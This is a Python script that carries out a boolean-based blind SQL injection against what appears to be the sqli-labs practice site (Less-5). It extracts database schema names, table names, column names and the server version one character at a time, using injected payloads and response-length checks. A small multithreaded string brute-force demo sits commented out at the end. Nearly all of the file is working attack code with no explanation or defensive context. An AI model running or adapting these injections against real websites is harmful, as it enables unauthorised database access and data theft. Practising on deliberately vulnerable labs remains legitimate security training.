import requests

schema_name = 'group_concat(schema_name) from information_schema.schemata'
table_name = 'group_concat(table_name) from information_schema.tables where table_schema'
column_name = 'group_concat(column_name) from information_schema.columns where table_name'

def findx(z,x):
    num=0
    for i in range(7):
        num += (1<<(6-int(i)))
        url = z
        url += f'{x+1},1))>={num}--+'
        a = requests.get(url)
        if len(a.text) == 704:
            pass
        else:
            num -= (1<<(6-int(i)))
    print(chr(num),end='')

def Len(x):
    Len = 0
    for i in range(7):
        url = x
        Len += (1<<(6-int(i)))
        url += "'%s"%Len
        a = requests.get(url)
        if len(a.text) == 704:
            pass
        else:
            Len -= (1<<(6-int(i)))
    print(f"\nlen = {Len}")
    return Len


def schema():
    x = '''http://sqli.com/Less-5/?id=1' and LENGTH((select {}))>='''.format(schema_name)
    z = '''http://sqli.com/Less-5/?id=1' and ascii(substr((select {}),'''.format(schema_name)
    len = Len(x)
    for i in range(len):
        findx(z,i)
                    
schema()



def table(schema):
    x = '''http://sqli.com/Less-5/?id=1' and LENGTH((select {}='{}'))>='''.format(table_name,schema)
    len = Len(x)
    for i in range(len):
        url = '''http://sqli.com/Less-5/?id=1' and ascii(substr((select {}='{}'),'''.format(table_name,schema)
        findx(url,i)

table('security')


def column(table):
    x = '''http://sqli.com/Less-5/?id=1' and LENGTH((select {}='{}'))>='''.format(column_name,table)
    len = Len(x)
    for i in range(len):
        url = '''http://sqli.com/Less-5/?id=1' and ascii(substr((select {}='{}'),'''.format(column_name,table)
        findx(url,i)

column('emails')


def version():
    Len = 0
    for i in range(10):
        url = '''http://sqli.com/Less-5/?id=1' and LENGTH(version())='''
        url += "'%s"%i
        a = requests.get(url)
        if len(a.text) == 704:
            print("len=",i)
            Len = i
            break
    for i in range(Len):
        url = '''http://sqli.com/Less-5/?id=1' and ascii(substr(version(),{},1))='''.format(i+1)
        for j in range(42,128):
            x = url
            x+="%s--+"%(j)
            a = requests.get(x)
            if len(a.text) == 704:
                print(chr(j),end='')
                break

"""

import threading

def brute_force_string(start, end, target):
    for i in range(start, end):
        if str(i) == target:
            print("Found the target: " + str(i))
            return

# 设置要爆破的字符串范围和目标字符串
start = 0
end = 1000000
target = "123456"

# 设置线程数量
num_threads = 4

# 计算每个线程处理的范围
step = (end - start) // num_threads

# 创建线程列表
threads = []

# 创建并启动线程
for i in range(num_threads):
    thread_start = start + i * step
    thread_end = thread_start + step
    thread = threading.Thread(target=brute_force_string, args=(thread_start, thread_end, target))
    thread.start()
    threads.append(thread)

# 等待所有线程执行完毕
for thread in threads:
    thread.join()





"""